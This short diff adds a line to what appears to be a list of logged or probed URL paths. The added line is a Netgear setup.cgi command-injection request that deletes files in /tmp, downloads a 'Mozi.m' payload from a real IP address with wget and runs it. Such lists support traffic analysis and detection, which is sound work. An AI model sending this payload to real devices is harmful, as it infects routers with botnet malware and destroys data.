@@ -3713,3 +3713,4 @@ google.com:443
 /mini.phpa
 /Shiddi
 /contact-old/
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.60.215.159:54696/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
